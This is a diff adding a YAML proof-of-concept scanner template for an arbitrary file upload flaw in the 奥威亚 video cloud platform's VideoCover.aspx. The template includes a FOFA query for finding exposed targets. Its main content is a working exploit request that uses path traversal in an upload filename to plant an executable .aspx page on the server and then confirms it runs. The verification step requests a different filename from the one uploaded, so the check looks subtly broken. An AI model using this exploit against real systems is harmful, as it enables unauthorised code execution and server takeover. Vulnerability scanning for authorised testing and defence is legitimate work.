@@ -1,0 +1,31 @@
+id: poc-yaml-ao-wei-ya-video-cloud-platform-videocover-aspx-anyfile-upload
+info:
+  name: 奥威亚视频云平台VideoCover.aspx任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 奥威亚视频云
+  fofa: body="/Upload/DomainInfo/MaxAVALogo.png"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /Tools/Video/VideoCover.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=68c4ca658cd4332dc386f53710e63a10
+  data: '--68c4ca658cd4332dc386f53710e63a10
+
+    Content-Disposition: form-data; name="file";filename="/../../../AVA.ResourcesPlatform.WebUI/{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@Page Language="C#"%><%Response.Write("{{.t2}}");%>
+
+    --68c4ca658cd4332dc386f53710e63a10--'
+  expression: status_code == 200 && body == "Success"
+- method: GET
+  path: /{{.t2}}.aspx
+  expression: status_code == 200 && contains(body,t2)
+transport: http
